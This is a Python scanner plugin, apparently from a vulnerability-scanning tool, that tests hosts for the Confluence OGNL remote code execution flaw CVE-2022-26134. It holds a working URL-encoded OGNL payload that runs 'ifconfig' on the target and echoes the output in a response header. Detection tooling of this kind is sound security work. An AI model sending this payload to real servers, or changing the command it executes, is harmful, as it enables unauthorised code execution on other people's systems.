#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        path = '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40' \
               'java.lang.Runtime%40getRuntime%28%29.exec%28%22ifconfig%22%29.getInputStream' \
               '%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext' \
               '%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
        url = '{}://{}:{}{}'.format(service, ip, port, path)
        r = await http_client(ip, port).get(url)
        if 'x-cmd-response' in str(r.headers).lower() and 'BROADCAST,' in str(r.headers):
            ret = {
                'alert_group': 'Confluence RCE',
                'affects': url,
                'details': u'CVE-2022-26134：Confluence OGNL代码执行漏洞\n'
                           u'参考链接: https://cert.360.cn/warning/detail?id=b5ed926c419f0eeccc3c801c31e9d1a0 \n'
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8090, 'http', True, task_msg={})
    run_plugin_test(scan)
